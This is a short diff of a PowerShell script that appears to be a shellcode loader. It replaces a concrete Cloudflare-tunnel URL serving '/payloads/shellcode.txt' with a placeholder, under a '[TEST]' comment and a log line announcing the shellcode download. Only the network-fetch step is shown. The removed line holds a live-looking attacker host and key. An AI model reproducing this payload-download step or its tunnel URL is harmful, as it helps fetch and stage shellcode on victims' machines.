@@ -35,7 +35,7 @@ try {
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
 
 # Test network connectivity
-$testUrl = 'https://dale-recently-shed-cup.trycloudflare.com/payloads/shellcode.txt?key=2cf7cbeab9fd5a21'
+$testUrl = 'https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN'
 Log "[TEST] Downloading shellcode from: $testUrl"
 
 try {
